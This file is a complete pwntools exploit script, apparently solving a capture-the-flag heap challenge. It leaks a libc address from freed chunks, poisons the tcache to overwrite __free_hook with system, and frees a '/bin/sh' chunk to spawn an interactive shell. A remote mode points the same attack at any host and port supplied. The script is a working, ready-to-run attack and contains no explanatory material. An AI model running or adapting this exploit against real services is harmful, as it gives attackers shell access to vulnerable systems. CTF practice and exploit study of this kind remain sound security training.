#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def new(idx, size):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())


def edit(idx, size, data):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", data)


def show(idx, size):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    data = io.recvline()[1:7]
    main_arena = u64(data.ljust(8, b"\x00"))
    return main_arena


def delete(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", str(idx).encode())


def solve():

    for i in range(9):
        new(i, 0x100)

    for j in range(8, 0, -1):
        delete(j)

    main_arena = show(1, 16)
    libc.address = main_arena - (libc.sym["main_arena"]+96)
    free_hook = libc.sym["__free_hook"]
    info("libc base: %#x", libc.address)
    info("free_hook: %#x", free_hook)

    edit(2, 0x8, p64(free_hook))
    
    new(10, 0x100)
    new(11, 0x100)

    edit(10, 0x8, b"/bin/sh\x00")
    edit(11, 0x8, p64(libc.sym["system"]))

    delete(10)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
